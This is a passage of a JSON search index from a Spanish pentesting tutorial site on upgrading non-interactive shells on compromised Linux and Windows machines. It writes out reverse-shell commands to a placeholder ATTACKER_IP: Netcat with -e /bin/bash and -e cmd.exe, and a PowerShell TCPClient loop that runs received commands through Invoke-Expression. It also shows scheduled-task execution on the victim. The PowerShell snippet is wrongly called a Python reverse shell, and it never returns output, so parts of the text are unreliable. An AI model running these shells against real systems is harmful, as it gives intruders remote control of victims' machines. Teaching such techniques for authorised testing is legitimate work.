tambi\u00e9n te permite obtener una shell interactiva.</p> </li> </ol>"},{"location":"upgrading-non-interactive-shells/linux/upgrading-non-interactive-shell-linux/#escuchar-en-la-maquina-atacante","title":"Escuchar en la m\u00e1quina atacante:","text":"<p><code>bash nc -lvnp 4444</code></p>"},{"location":"upgrading-non-interactive-shells/linux/upgrading-non-interactive-shell-linux/#en-la-maquina-victima-enviando-la-shell","title":"En la m\u00e1quina v\u00edctima (enviando la shell):","text":"<p><code>bash nc ATTACKER_IP 4444 -e /bin/bash</code></p> <p>\ud83d\udd39 Explicaci\u00f3n: Esto crea una conexi\u00f3n entre la m\u00e1quina v\u00edctima y la m\u00e1quina atacante, proporcionando una shell interactiva de la v\u00edctima a trav\u00e9s de Netcat.</p>"},{"location":"upgrading-non-interactive-shells/linux/upgrading-non-interactive-shell-linux/#conclusion","title":"\ud83d\ude80 Conclusi\u00f3n:","text":"<p>Upgradear una shell no interactiva en Linux implica convertir una shell limitada o sin funcionalidades avanzadas en una shell completamente funcional. Algunos m\u00e9todos comunes para lograr esto incluyen:</p> <ul> <li><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code>: Para invocar una nueva shell de Bash interactiva.</li> <li><code>bash -i</code>: Para invocar Bash en modo interactivo.</li> <li><code>stty raw -echo; fg</code>: Para mejorar la terminal y restaurar la interactividad.</li> <li><code>script /dev/null</code>: Para crear una nueva sesi\u00f3n interactiva.</li> <li>Uso de <code>reset</code>: Para restaurar la terminal.</li> <li><code>nc</code> (Netcat): Para obtener una shell interactiva a trav\u00e9s de la red.</li> </ul>"},{"location":"upgrading-non-interactive-shells/windows/upgrading-non-interactive-shell-windows/","title":"Upgrading Non-Interactive Shell Windows","text":"<p>En Windows, \"upgradear\" o mejorar una shell no interactiva se refiere a la t\u00e9cnica de transformar una shell limitada o restringida (por ejemplo, cuando obtienes acceso a una m\u00e1quina comprometida y no tienes una terminal completa) en una shell interactiva que te permita realizar una mayor variedad de comandos y tener control total del sistema.</p>"},{"location":"upgrading-non-interactive-shells/windows/upgrading-non-interactive-shell-windows/#metodos-comunes-para-upgradear-una-shell-no-interactiva-en-windows","title":"\ud83d\udccc M\u00e9todos Comunes para \"Upgradear\" una Shell No Interactiva en Windows:","text":"<ol> <li>Usar <code>powershell.exe</code> para obtener una shell interactiva</li> </ol> <p>Si tienes acceso a PowerShell en la m\u00e1quina comprometida, pero la shell no es interactiva, puedes invocar PowerShell de manera interactiva. Por ejemplo, puedes ejecutar este comando para obtener una nueva sesi\u00f3n de PowerShell que sea completamente funcional:</p> <pre><code>powershell.exe -NoExit\n</code></pre> <p>\ud83d\udd39 Explicaci\u00f3n: El par\u00e1metro <code>-NoExit</code> le indica a PowerShell que no cierre la sesi\u00f3n despu\u00e9s de ejecutar el comando. Esto crea una nueva instancia de PowerShell interactiva en la cual puedes ejecutar comandos normalmente.</p> <ol> <li>Usar <code>cmd.exe</code> para abrir una shell de comandos nueva</li> </ol> <p>Si tienes acceso a <code>cmd.exe</code>, pero la shell est\u00e1 restringida, puedes intentar abrir una nueva ventana de comandos para obtener una shell interactiva completa:</p> <pre><code>start cmd.exe\n</code></pre> <p>\ud83d\udd39 Explicaci\u00f3n: El comando <code>start</code> abre una nueva ventana de cmd.exe, proporcionando una shell completamente interactiva.</p> <ol> <li>Usar <code>python</code> para crear una reverse shell (con conexi\u00f3n a tu m\u00e1quina)</li> </ol> <p>Si tienes Python instalado en el sistema, puedes crear una reverse shell (conexi\u00f3n inversa) que te permita tomar el control de la m\u00e1quina comprometida de forma remota. Esto se puede hacer con el siguiente comando:</p> <pre><code>$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', 4444);$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);while($true){$writer.Write($null);$writer.Flush();$data = $reader.ReadLine();Invoke-Expression $data}\n</code></pre> <p>\ud83d\udd39 Explicaci\u00f3n:</p> <ul> <li><code>ATTACKER_IP</code> es la IP de tu m\u00e1quina atacante.</li> <li><code>4444</code> es el puerto en el que tu m\u00e1quina atacante escuchar\u00e1.</li> <li> <p>El comando crea un cliente TCP que se conecta a tu m\u00e1quina atacante y te da acceso a la shell de la v\u00edctima para ejecutar comandos remotamente.</p> </li> <li> <p>Crear un reverse shell con <code>nc</code> (Netcat)</p> </li> </ul> <p>Si tienes Netcat en la m\u00e1quina comprometida, puedes usarlo para abrir una reverse shell. Esto te da acceso a la terminal remota de la m\u00e1quina.</p>"},{"location":"upgrading-non-interactive-shells/windows/upgrading-non-interactive-shell-windows/#en-tu-maquina-atacante-escuchando-en-el-puerto-4444","title":"En tu m\u00e1quina atacante (escuchando en el puerto 4444):","text":"<pre><code>nc -lvnp 4444\n</code></pre>"},{"location":"upgrading-non-interactive-shells/windows/upgrading-non-interactive-shell-windows/#en-la-maquina-comprometida-ejecutando-el-reverse-shell","title":"En la m\u00e1quina comprometida (ejecutando el reverse shell):","text":"<pre><code>nc ATTACKER_IP 4444 -e cmd.exe\n</code></pre> <p>\ud83d\udd39 Explicaci\u00f3n:</p> <ul> <li><code>nc -lvnp 4444</code> abre un puerto en tu m\u00e1quina atacante.</li> <li> <p>El comando en la v\u00edctima (<code>nc ATTACKER_IP 4444 -e cmd.exe</code>) crea una conexi\u00f3n hacia tu m\u00e1quina atacante y te proporciona una shell interactiva de <code>cmd.exe</code>.</p> </li> <li> <p>Usar <code>schtasks</code> para ejecutar un script o shell interactiva</p> </li> </ul> <p>Si tienes acceso a crear tareas programadas en la v\u00edctima, puedes crear una tarea programada que ejecute una shell interactiva. Un ejemplo podr\u00eda ser ejecutar <code>cmd.exe</code> de manera interactiva o ejecutar PowerShell como un proceso independiente.</p> <pre><code>schtasks /create /sc once /tn \"MyTask\" /tr \"cmd.exe\" /st 12:00\n</code></pre> <p>\ud83d\udd39 Explicaci\u00f3n: Este comando crea una tarea programada llamada \"MyTask\" que ejecutar\u00e1 <code>cmd.exe</code> cuando la hora llegue a las 12:00. Puedes configurarlo para ejecutar <code>cmd.exe</code> de manera interactiva.</p>"},{"location":"upgrading-non-interactive-shells/windows/upgrading-non-interactive-shell-windows/#conclusion","title":"\ud83d\ude80 Conclusi\u00f3n:","text":"<p>En Windows, puedes upgradear una shell no interactiva a una shell interactiva utilizando una variedad de m\u00e9todos, como:</p> <ul> <li><code>powershell.exe -NoExit</code> para invocar PowerShell de manera interactiva.</li> <li><code>start cmd.exe</code> para abrir una nueva ventana de comandos.</li> <li>Reverse shell con Python usando <code>New-Object System.Net.Sockets.TCPClient</code>.</li> <li>Reverse shell con Netcat usando el comando <code>nc</code>.</li> <li>Uso de tareas programadas con <code>schtasks</code> para ejecutar una shell interactiva.</li> </ul>"}]}